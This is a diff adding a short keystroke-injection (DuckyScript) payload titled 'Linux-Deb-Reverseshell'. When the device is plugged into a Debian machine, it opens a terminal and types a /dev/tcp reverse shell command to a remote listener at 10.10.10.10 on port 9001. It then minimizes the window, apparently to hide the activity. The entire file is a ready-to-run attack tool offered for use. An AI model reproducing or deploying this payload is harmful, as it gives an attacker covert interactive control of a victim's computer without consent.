@@ -1,0 +1,17 @@
+REM Author: Pentestersploit/Adrilaw
+REM Github: https://github.com/Adrilaw
+REM Xda-developer: @Kidpentester
+REM Title: Linux-Deb-Reverseshell
+REM Description: Uses /dev/tcp to get a reverse shell
+REM Target: Debian based
+REM VERSION: 1.2
+DELAY 500
+GUI t                  
+DELAY 1000
+STRING bash            
+ENTER
+DELAY 500
+STRING sh -i >& /dev/tcp/10.10.10.10/9001 0>&1 // Reverse shell command
+ENTER
+DELAY 500
+ALT F9                
